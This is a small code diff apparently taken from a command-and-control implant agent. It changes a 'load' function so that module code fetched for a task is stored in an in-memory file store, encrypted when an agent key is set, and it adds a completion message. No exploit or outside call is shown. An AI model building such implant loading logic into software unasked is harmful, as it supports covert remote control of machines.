@@ -2,7 +2,12 @@ def load(task_id, file_id, cmds):
     global responses
     code = reverse_upload(task_id, file_id)
     name = cmds
-    dynfs[name] = code
+
+    if agent.get_Encryption_key() == "":
+        dynfs[name] = code
+    else:
+        dynfs[name] = encrypt_code(code)
+
 
 
     response = {
@@ -18,5 +23,7 @@ def load(task_id, file_id, cmds):
         }
 
     responses.append(response)
+
+    print("\t- Load Done")
 
     return
